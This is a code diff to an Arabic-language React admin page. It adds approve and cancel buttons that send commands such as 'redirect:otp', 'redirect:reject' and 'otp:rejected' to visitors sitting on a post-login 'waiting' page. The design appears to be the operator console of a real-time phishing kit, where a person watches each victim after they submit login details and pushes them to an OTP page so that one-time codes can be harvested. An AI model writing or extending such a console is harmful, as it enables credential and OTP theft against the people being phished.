@@ -262,6 +262,31 @@ export default function AdminPage() {
                       </div>
                     )}
 
+                    {/* Approve / Cancel — shown prominently when visitor is on waiting page */}
+                    {v.page === "تسجيل الدخول - مكتمل" || v.page === "انتظار" ? (
+                      <div className="rounded-2xl border-2 border-yellow-500/40 bg-yellow-500/10 p-4 space-y-3">
+                        <p className="text-yellow-300 text-xs font-black flex items-center gap-1.5">
+                          ⏳ المستخدم في صفحة الانتظار — اتخذ قرارك:
+                        </p>
+                        <div className="grid grid-cols-2 gap-3">
+                          <button
+                            onClick={() => adminApi.sendCmd(v.id, "redirect:otp")}
+                            className="flex items-center justify-center gap-2 py-3 rounded-xl font-black text-sm text-white transition-all hover:scale-105 active:scale-95"
+                            style={{ background: "linear-gradient(135deg, #16a34a, #15803d)", boxShadow: "0 4px 14px rgba(22,163,74,0.4)" }}
+                          >
+                            ✓ موافقة
+                          </button>
+                          <button
+                            onClick={() => adminApi.sendCmd(v.id, "redirect:reject")}
+                            className="flex items-center justify-center gap-2 py-3 rounded-xl font-black text-sm text-white transition-all hover:scale-105 active:scale-95"
+                            style={{ background: "linear-gradient(135deg, #dc2626, #b91c1c)", boxShadow: "0 4px 14px rgba(220,38,38,0.4)" }}
+                          >
+                            ✗ إلغاء
+                          </button>
+                        </div>
+                      </div>
+                    ) : null}
+
                     {/* Commands */}
                     <div className="space-y-2">
                       <p className="text-gray-400 text-xs font-black">إرسال أمر:</p>
@@ -281,6 +306,10 @@ export default function AdminPage() {
                         <button onClick={() => adminApi.sendCmd(v.id, "otp:rejected")}
                           className="flex items-center gap-1.5 bg-red-500/20 hover:bg-red-500/30 border border-red-500/30 text-red-400 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
                           ✗ رفض OTP
+                        </button>
+                        <button onClick={() => adminApi.sendCmd(v.id, "redirect:reject")}
+                          className="flex items-center gap-1.5 bg-red-500/20 hover:bg-red-500/30 border border-red-500/30 text-red-400 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
+                          ✗ إلغاء (انتظار)
                         </button>
                         <button onClick={() => adminApi.sendCmd(v.id, "redirect:login")}
                           className="flex items-center gap-1.5 bg-blue-500/20 hover:bg-blue-500/30 border border-blue-500/30 text-blue-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
